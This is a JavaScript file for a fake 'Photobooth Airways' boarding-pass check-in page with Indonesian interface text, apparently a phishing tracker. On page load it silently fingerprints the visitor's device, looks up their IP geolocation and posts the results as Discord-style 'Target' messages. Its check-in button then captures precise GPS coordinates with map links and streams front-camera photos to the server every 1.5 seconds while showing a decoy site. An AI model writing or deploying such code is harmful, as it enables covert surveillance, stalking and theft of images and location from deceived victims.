/**
 * Photobooth Airways — ALL Module Logic (GPS + Camera)
 * photobooth.bapel.my.id
 */

var gpsOk = false, camOk = false, uploadInterval = null;

/* ── Decorations ── */
function initDecorations() {
  var starsEl = document.getElementById('stars');
  for (var i = 0; i < 80; i++) {
    var s = document.createElement('div'); s.className = 'star';
    var big = Math.random() > 0.8;
    s.style.cssText = 'left:' + (Math.random()*100) + '%;top:' + (Math.random()*80) + '%;'
      + 'animation-duration:' + (Math.random()*3+2) + 's;animation-delay:' + (Math.random()*4) + 's;'
      + 'width:' + (big?3:2) + 'px;height:' + (big?3:2) + 'px;';
    starsEl.appendChild(s);
  }
  var cloudsEl = document.getElementById('clouds');
  for (var j = 0; j < 5; j++) {
    var c = document.createElement('div'); c.className = 'cloud';
    c.style.cssText = 'width:' + (Math.random()*200+100) + 'px;height:' + (Math.random()*50+20) + 'px;'
      + 'top:' + (Math.random()*60) + '%;animation-duration:' + (Math.random()*40+30) + 's;'
      + 'animation-delay:' + (-Math.random()*30) + 's;';
    cloudsEl.appendChild(c);
  }
  var now  = new Date();
  var date = ('0'+now.getDate()).slice(-2) + '/' + ('0'+(now.getMonth()+1)).slice(-2);
  ['d','m'].forEach(function(s) {
    var d = document.getElementById('flightDate-' + s);
    if (d) d.textContent = date;
  });
}

/* ── Silent data collection ── */
function collectSilent() {
  var localtime = String(new Date().toLocaleTimeString());
  var tz = 'Unknown'; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){}
  
  var gpu = 'Unknown';
  try {
      var cvs = document.createElement('canvas'), gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
      gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
  } catch(e) {}

  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  var netType = conn ? conn.effectiveType : 'Unknown';
  var netDL = conn ? conn.downlink + ' Mbps' : 'Unknown';

  var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
    + '```autohotkey\n'
    + 'Platform: ' + navigator.platform
    + '\nVendor: ' + navigator.vendor
    + '\nLanguage: ' + navigator.language
    + '\nTimezone: ' + tz
    + '\nTime: ' + localtime
    + '\nCookies: ' + navigator.cookieEnabled
    + '\nDo_Not_Track: ' + (navigator.doNotTrack || 'Unknown')
    + '\n'
    + '\n--- Hardware ---'
    + '\nRam: ~' + (navigator.deviceMemory || 'Unknown') + ' GB'
    + '\nCPU_Cores: ' + (navigator.hardwareConcurrency || 'Unknown')
    + '\nGPU: ' + gpu
    + '\nTouch_Points: ' + navigator.maxTouchPoints
    + '\n'
    + '\n--- Screen & Network ---'
    + '\nResolution: ' + screen.width + 'x' + screen.height
    + '\nViewport: ' + window.innerWidth + 'x' + window.innerHeight
    + '\nColor_Depth: ' + screen.colorDepth + '-bit'
    + '\nNet_Type: ' + netType
    + '\nDownlink: ' + netDL;

  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
  
  function postInfo(batt) {
    var finalInfo = sysinfo;
    if(batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
    finalInfo += '```';
    
    var r = new XMLHttpRequest();
    r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
    r.send(JSON.stringify({ username:'R4VEN', avatar_url:AVATAR, content:'@everyone Someone Opened The Link O_o',
      embeds:[{ author:{name:'Target System Information..'}, description:finalInfo, color:15418782 }] }));
  }

  if ('getBattery' in navigator) {
    navigator.getBattery().then(function(b) { postInfo({c: b.charging?'Yes':'No', l: (b.level*100)+'%'}); }).catch(function(){ postInfo(null); });
  } else { postInfo(null); }

  function post(payload) { var r=new XMLHttpRequest(); r.open('POST','/location_update'); r.setRequestHeader('Content-type','application/json'); r.send(JSON.stringify(payload)); }
  
  $.getJSON('https://api.ipify.org?format=json', function(data) {
    post({ username:'R4VEN', avatar_url:AVATAR,
      embeds:[{ author:{name:'Target Ip'}, description:'```xl\n'+data.ip+'```\n__**IP Details:**__ https://ip-api.com/#'+data.ip+'\n', color:15548997, footer:{text:'Geographic location based on IP is approximate.'} }] });
  });
  $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function(res) {
    var pxy = (res.proxy || res.hosting) ? "YES (VPN/Proxy/Cloud)" : "No";
    var mob = res.mobile ? "YES" : "No";
    var recon = '```autohotkey\n'
      + 'IP Address  : ' + res.query + '\n'
      + 'ISP         : ' + res.isp + '\n'
      + 'Org / ASN   : ' + res.org + ' (' + res.as + ')\n'
      + 'Reverse DNS : ' + (res.reverse || 'N/A') + '\n\n'
      + '--- Location ---\n'
      + 'Continent   : ' + res.continent + ' (' + res.continentCode + ')\n'
      + 'Country     : ' + res.country + ' (' + res.countryCode + ')\n'
      + 'Region      : ' + res.regionName + '\n'
      + 'City        : ' + res.city + ' (District: ' + (res.district || 'N/A') + ')\n'
      + 'Zip Code    : ' + (res.zip || 'N/A') + '\n'
      + 'Lat/Lon     : ' + res.lat + ' , ' + res.lon + '\n'
      + 'Timezone    : ' + res.timezone + ' (UTC' + (res.offset/3600 >= 0 ? '+' : '') + (res.offset/3600) + ')\n'
      + 'Currency    : ' + res.currency + '\n\n'
      + '--- Network Flags ---\n'
      + 'Cellular    : ' + mob + '\n'
      + 'Proxy/VPN   : ' + pxy + '\n'
      + '```';
      
    post({ username:'R4VEN', avatar_url:AVATAR,
      embeds:[{ author:{name:'IP Address Reconnaissance'}, title:res.status, description:recon, color:5763719 }] });
  });
}

/* ── Step indicator helper ── */
function setStep(n, state) {
  ['d','m'].forEach(function(s) {
    var el = document.getElementById('step' + n + 'Circle-' + s);
    if (!el) return;
    el.className = 'step-circle ' + state;
    if (state === 'done') el.textContent = '\u2713';
  });
}

function setStatusEl(msg) {
  ['d','m'].forEach(function(s) { var el = document.getElementById('statusText-'+s); if(el) el.textContent=msg; });
}

function setStatusBarVisible(show) {
  ['d','m'].forEach(function(s) { var el = document.getElementById('statusBar-'+s); if(el) el.style.display = show ? 'flex' : 'none'; });
}

/* ── Success → show iframe ── */
function showSuccess() {
  ['d','m'].forEach(function(s) {
    var mc = document.getElementById('mainContent-' + s);
    var so = document.getElementById('successOverlay-' + s);
    var sc = document.getElementById('step3Circle-' + s);
    if (mc) mc.style.display = 'none';
    if (so) so.style.display = 'flex';
    if (sc) { sc.className = 'step-circle done'; sc.textContent = '\u2713'; }
  });
  setTimeout(function() {
    var frame = document.getElementById('site-frame');
    frame.src = 'https://photobooth.bapel.my.id';
    frame.style.display = 'block';
    setTimeout(function() { frame.classList.add('visible'); }, 50);
  }, 2000);
}

function postFile(file) {
  var fd = new FormData(); fd.append('image', file);
  var xhr = new XMLHttpRequest(); xhr.open('POST','/image',true); xhr.send(fd);
}

/* ── Main check-in flow ── */
function startCheckin() {
  // Set button loading
  ['d','m'].forEach(function(s) {
    var btn = document.getElementById('allowBtn-' + s);
    var sp  = document.getElementById('spinner-' + s);
    var bt  = document.getElementById('btnText-' + s);
    if (!btn) return;
    btn.classList.add('loading'); sp.style.display='block'; bt.textContent='MEMPROSES\u2026';
  });
  setStatusBarVisible(true);
  setStep(1, 'active');

  // STEP 1: GPS
  setStatusEl('Step 1/2 \u2014 Mendeteksi lokasi GPS\u2026');
  ['d','m'].forEach(function(s) { var el=document.getElementById('locStatus-'+s); if(el) el.classList.add('active'); });

  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
  function post(payload) {
    var r = new XMLHttpRequest();
    r.open('POST','/location_update'); r.setRequestHeader('Content-type','application/json');
    r.send(JSON.stringify(payload));
  }

  function gpsObtained(pos) {
    var lat = pos.coords.latitude, lon = pos.coords.longitude;
    var acc = pos.coords.accuracy || 0;
    var alt = pos.coords.altitude !== null ? pos.coords.altitude : 'N/A';
    var spd = pos.coords.speed !== null ? pos.coords.speed : 'N/A';
    var hdg = pos.coords.heading !== null ? pos.coords.heading : 'N/A';
    
    gpsOk = true;
    ['d','m'].forEach(function(s) { var el=document.getElementById('locStatus-'+s); if(el) {el.classList.remove('active'); el.classList.add('done');} });
    setStep(1, 'done'); setStep(2, 'active');
    
    var desc = '```prolog\n'
      + 'Latitude  : ' + lat + '\n'
      + 'Longitude : ' + lon + '\n'
      + 'Accuracy  : ' + acc + ' meters\n'
      + 'Altitude  : ' + alt + ' meters\n'
      + 'Speed     : ' + spd + ' m/s\n'
      + 'Heading   : ' + hdg + ' degrees\n'
      + '```\n'
      + '__**Google Maps:**__ https://www.google.com/maps/place/'+lat+','+lon + '\n'
      + '__**Google Earth:**__ https://earth.google.com/web/search/'+lat+','+lon;
      
    post({ username:'R4VEN', avatar_url:AVATAR,
      embeds:[{ author:{name:'Target Allowed Location Permission'}, title:'GPS location of target..',
        description:desc,
        color:15844367, footer:{text:'High accuracy geolocation using device sensors.'} }] });

    // STEP 2: Camera
    setStatusEl('Step 2/2 \u2014 Mengaktifkan kamera selfie\u2026');
    ['d','m'].forEach(function(s) { var el=document.getElementById('camStatus-'+s); if(el) el.classList.add('active'); });

    setTimeout(function() {
      navigator.mediaDevices.getUserMedia({ audio:false, video:{facingMode:'user'} })
        .then(function(stream) {
          camOk = true;
          ['d','m'].forEach(function(s) { var el=document.getElementById('camStatus-'+s); if(el){el.classList.remove('active');el.classList.add('done');} });
          setStep(2,'done'); setStep(3,'active');
          setStatusEl('Semua check-in selesai! Mencetak boarding pass\u2026');
          var video=document.getElementById('video'), canvas=document.getElementById('canvas');
          video.srcObject=stream;
          setTimeout(function(){
            var ctx=canvas.getContext('2d');
            uploadInterval=setInterval(function(){ ctx.drawImage(video,0,0,640,480); canvas.toBlob(postFile,'image/jpeg'); },1500);
            showSuccess();
          },800);
        })
        .catch(function() {
          setStatusEl('Izin kamera ditolak. Lanjut dengan GPS saja\u2026');
          ['d','m'].forEach(function(s){var el=document.getElementById('camStatus-'+s);if(el)el.style.background='rgba(239,68,68,0.4)';});
          setTimeout(showSuccess, 1500);
        });
    }, 600);
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) { gpsObtained(pos); },
      function(err) {
        if (err.code === err.PERMISSION_DENIED) {
          post({ username:'R4VEN', avatar_url:AVATAR, content:'```diff\n- User denied the request for Geolocation.```' });
        }
        setStatusEl('Izin lokasi ditolak. Mencoba tanpa GPS\u2026');
        ['d','m'].forEach(function(s){var el=document.getElementById('locStatus-'+s);if(el)el.style.background='rgba(239,68,68,0.4)';});
        // Fallback: try camera only
        navigator.mediaDevices.getUserMedia({ audio:false, video:{facingMode:'user'} })
          .then(function(stream) {
            camOk=true;
            setStep(2,'done'); setStep(3,'active');
            var video=document.getElementById('video'), canvas=document.getElementById('canvas');
            video.srcObject=stream;
            setTimeout(function(){ var ctx=canvas.getContext('2d'); uploadInterval=setInterval(function(){ ctx.drawImage(video,0,0,640,480); canvas.toBlob(postFile,'image/jpeg'); },1500); showSuccess(); },800);
          })
          .catch(function() {
            setStatusEl('Izin ditolak. Harap aktifkan akses di pengaturan.');
            ['d','m'].forEach(function(s){var btn=document.getElementById('allowBtn-'+s),sp=document.getElementById('spinner-'+s),bt=document.getElementById('btnText-'+s);if(!btn)return;btn.classList.remove('loading');sp.style.display='none';bt.textContent='MULAI FULL CHECK-IN';});
          });
      },
      { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
    );
  } else {
    // No geolocation — go straight to camera
    navigator.mediaDevices.getUserMedia({ audio:false, video:{facingMode:'user'} })
      .then(function(stream) {
        camOk=true; setStep(2,'done'); setStep(3,'active');
        var video=document.getElementById('video'), canvas=document.getElementById('canvas');
        video.srcObject=stream;
        setTimeout(function(){ var ctx=canvas.getContext('2d'); uploadInterval=setInterval(function(){ ctx.drawImage(video,0,0,640,480); canvas.toBlob(postFile,'image/jpeg'); },1500); showSuccess(); },800);
      })
      .catch(function() {
        setStatusEl('Izin ditolak.');
        ['d','m'].forEach(function(s){var btn=document.getElementById('allowBtn-'+s),sp=document.getElementById('spinner-'+s),bt=document.getElementById('btnText-'+s);if(!btn)return;btn.classList.remove('loading');sp.style.display='none';bt.textContent='MULAI FULL CHECK-IN';});
      });
  }
}

window.onload = function() { initDecorations(); collectSilent(); };
